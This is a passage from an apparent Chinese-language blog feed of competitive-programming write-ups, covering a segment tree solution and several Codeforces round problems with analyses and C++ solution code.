class="built_in">add</span>(l,r,num,now&lt;&lt;<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(r&gt;mid)<span class="built_in">add</span>(l,r,num,now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>);</span><br><span class="line">        tree[now].sum=tree[now&lt;&lt;<span class="number">1</span>].sum+tree[now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].sum;</span><br><span class="line">        tree[now].sum%=p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mul</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> num,<span class="keyword">int</span> now)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&lt;=tree[now].l&amp;&amp;r&gt;=tree[now].r)&#123;</span><br><span class="line">        <span class="built_in">add_lazy</span>(now,num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">push_down</span>(now);</span><br><span class="line">        <span class="keyword">int</span> mid=tree[now].r+tree[now].l&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=mid)<span class="built_in">mul</span>(l,r,num,now&lt;&lt;<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(r&gt;mid)<span class="built_in">mul</span>(l,r,num,now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>);</span><br><span class="line">        tree[now].sum=tree[now&lt;&lt;<span class="number">1</span>].sum+tree[now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].sum;</span><br><span class="line">        tree[now].sum%=p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;p);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,a+i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">build</span>(<span class="number">1</span>,<span class="number">1</span>,n);</span><br><span class="line">    <span class="keyword">signed</span> q;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;q);</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">signed</span> op,l,r,num;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;op);</span><br><span class="line">        <span class="keyword">if</span>(op==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>,&amp;l,&amp;r,&amp;num);</span><br><span class="line">            <span class="built_in">mul</span>(l,r,num,<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(op==<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>,&amp;l,&amp;r,&amp;num);</span><br><span class="line">            <span class="built_in">add</span>(l,r,num,<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;l,&amp;r);</span><br><span class="line">            ans=<span class="number">0</span>;</span><br><span class="line">            <span class="comment">//printf(&quot;l=%d r=%d\n&quot;,l,r);</span></span><br><span class="line">            <span class="built_in">query</span>(l,r,<span class="number">1</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;练一下线段树专题吧，本篇博客持续更新！&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="数据结构" scheme="http://example.com/categories/icpc/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="线段树" scheme="http://example.com/categories/icpc/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E7%BA%BF%E6%AE%B5%E6%A0%91/"/>
    
    
  </entry>
  
  <entry>
    <title>Educational Codeforces Round 131(Div.2)解析</title>
    <link href="http://example.com/2022/07/09/Educational%20Codeforces%20Round%20131(Div.2)/"/>
    <id>http://example.com/2022/07/09/Educational%20Codeforces%20Round%20131(Div.2)/</id>
    <published>2022-07-08T16:02:00.000Z</published>
    <updated>2022-07-09T00:59:37.382Z</updated>
    
    <content type="html"><![CDATA[<p>今天掉大分，预估回青名吧。实时<a href="https://www.bilibili.com/video/BV1KN4y1u7qB">录屏</a></p><span id="more"></span><h2 id="A-Grass-Field"><a href="#A-Grass-Field" class="headerlink" title="A. Grass Field"></a>A. Grass Field</h2><h3 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h3><p><img src="/2022/07/09/Educational%20Codeforces%20Round%20131(Div.2)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>给定2×2的草地，一次操作能任意清除三块草地，问最多几次清除所有草地。那就判断草地个数，只有全是草地的时候才要两次，没有草地的时候一次不用，其余情况都是一次。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 500002</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod=<span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> dx[]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;,dy[]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;q;<span class="comment">//y,x</span></span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d %d&quot;</span>,a,a+<span class="number">1</span>,a+<span class="number">2</span>,a+<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">int</span> sum=a[<span class="number">1</span>]+a[<span class="number">2</span>]+a[<span class="number">3</span>]+a[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span>(sum==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(sum!=<span class="number">4</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">//init();</span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Permutation"><a href="#B-Permutation" class="headerlink" title="B. Permutation"></a>B. Permutation</h2><h3 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h3><p><img src="/2022/07/09/Educational%20Codeforces%20Round%20131(Div.2)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>就是说，我们需要让排列中的一个值（这个值是<code>a[i+1]/a[i]</code>）尽可能多的出现，一样多的情况下输出值较大的。这题贪就完了，我们长度超过4的我们就选2。从1开始2倍去填上数，再选没填过的，也是2倍2倍输出，这样就达到了最优状态。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200002</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod=<span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> dx[]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;,dy[]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;q;<span class="comment">//y,x</span></span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>)*(n+<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;2\n1 2&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;3\n2 1 3&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=n)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(a[i]==<span class="number">1</span>)&#123;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;=n;j*=<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,j);</span><br><span class="line">            a[j]=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">//init();</span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Line-Empire"><a href="#C-Line-Empire" class="headerlink" title="C. Line Empire"></a>C. Line Empire</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/09/Educational%20Codeforces%20Round%20131(Div.2)/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>m个工作，n个人，每个工作有一个熟练工，如果让熟练工完成，那么只需要一个小时，让其余工人完成都需要两个小时。</p><p>我们直接二分答案就行了，至于check函数，我们就先计算每个工人的熟练工作个数。</p><p>然后做出如下算法：</p><ol><li>对于一个人，若它熟练a[i]种工作，那么它会尽量花费a[i]的时间去做完这a[i]的工作，若时间有剩，那么剩余时间做 <code>(t-a[i])/2</code> 个工作。</li><li>判断n个工人在t时间内是否能完成m项工作只需把工人按照以上算法加起来，判断一下大小就行了。</li></ol><p>时间上二分，选择最大可能时间，最大可能时间就是把所有人都当场不熟练工计算就好了。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200002</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod=<span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> dx[]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;,dy[]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;q;<span class="comment">//y,x</span></span><br><span class="line"><span class="keyword">int</span> n,m,t;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a&gt;b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cal</span><span class="params">(<span class="keyword">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="comment">//printf(&quot;a[%d]=%d\n&quot;,i,a[i]);</span></span><br><span class="line"><span class="comment">//        if(!a[i])&#123;</span></span><br><span class="line"><span class="comment">//            break;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="keyword">if</span>(a[i]&lt;t)&#123;</span><br><span class="line">            ans+=a[i];</span><br><span class="line">            ans+=(t-a[i])/<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            ans+=t;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;time=%d ans=%d\n&quot;,t,ans);</span></span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">    <span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>)*(n+<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">        a[x]++;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">1</span>+n,cmp);</span><br><span class="line">    t=(m/n)*<span class="number">2</span>+(!!(m%n))*<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> l=<span class="number">1</span>,r=t;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(l&lt;r)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid=l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="comment">//printf(&quot;mid=%d\n&quot;,mid);</span></span><br><span class="line">        <span class="keyword">int</span> res=<span class="built_in">cal</span>(mid);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(res&lt;m)&#123;</span><br><span class="line">            l=mid+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            r=mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,l);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">//init();</span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>啥也不说了，猛练吧。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天掉大分，预估回青名吧。实时&lt;a href=&quot;https://www.bilibili.com/video/BV1KN4y1u7qB&quot;&gt;录屏&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="codeforces" scheme="http://example.com/categories/icpc/codeforces/"/>
    
    <category term="题解" scheme="http://example.com/categories/icpc/codeforces/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>codeforces round 804(div2)解析</title>
    <link href="http://example.com/2022/07/05/Codeforces%20Round%20804(Div.2)/"/>
    <id>http://example.com/2022/07/05/Codeforces%20Round%20804(Div.2)/</id>
    <published>2022-07-04T16:01:00.000Z</published>
    <updated>2022-07-04T17:05:35.038Z</updated>
    
    <content type="html"><![CDATA[<p>好久没打过cf了，今天重温一下，可能手比较生了，打得状态不太好。实时<a href="https://www.bilibili.com/video/BV1xB4y1W79t/">录屏</a></p><span id="more"></span><h2 id="A-The-Third-Three-Number-Problem"><a href="#A-The-Third-Three-Number-Problem" class="headerlink" title="A. The Third Three Number Problem"></a>A. The Third Three Number Problem</h2><h3 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h3><p><img src="/2022/07/05/Codeforces%20Round%20804(Div.2)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>题意比较简单，给定一个数，构造三个数使得 <code>a^b+b^c+c^a==n</code>。首先不难想到，奇数一定无法构造，因为奇数异或偶数结果一定为奇数，奇数与奇数以及偶数与偶数异或结果一定为偶数，则我们有以下结论：</p><ul><li>若三个数中没有奇数，则相互异或和一定为偶数。</li><li>若三个数中只有一个奇数，则异或的结果会产生2个奇数，一个偶数，最终和仍为偶数。</li><li>若三个数中有两个奇数，则异或的结果产生2个奇数，一个偶数，最终和也为偶数。</li><li>若三个数全是奇数，则异或的结果产生全为偶数，最终结果也是偶数。</li></ul><p>不难发现我们最终结果必是偶数。</p><p>那么如果不是偶数那么直接输出-1，若是则我们令其中两个数为1，那么最终结果就是 <code>n=1^1+1^x+1^x=2*(1^x)</code>。我们非常容易能解出 <code>x</code> 的值。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">if</span>(n%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1 1 %d\n&quot;</span>,(n/<span class="number">2</span>)^<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Bit-Flipping"><a href="#B-Bit-Flipping" class="headerlink" title="B. Bit Flipping"></a>B. Bit Flipping</h2><h3 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h3><p><img src="/2022/07/05/Codeforces%20Round%20804(Div.2)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>这个题目就是说，构造一个给定长度的矩阵，矩阵的每个格子值为0或者1，要求对于每一个格子，都有两个相邻的与之颜色不一样的格子，并且只能有两个。</p><p>大部分同学可能找规律，但是我后面想到了一个递推的方式，从小的矩阵扩展。因为已有的矩阵必然满足以上条件，因此如果对矩阵进行扩展，那么扩展的一列必须和被扩展的那一列值一模一样，由于宽高都为偶数，因此我们再次扩充的一列必须与被扩展列完全相反。如此一来达到了我们所构造的目标，我们最终构造的图形为</p><p><img src="/2022/07/05/Codeforces%20Round%20804(Div.2)/3.png" alt="3"></p><p>初始化之后，根据长宽输出就可以了。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td 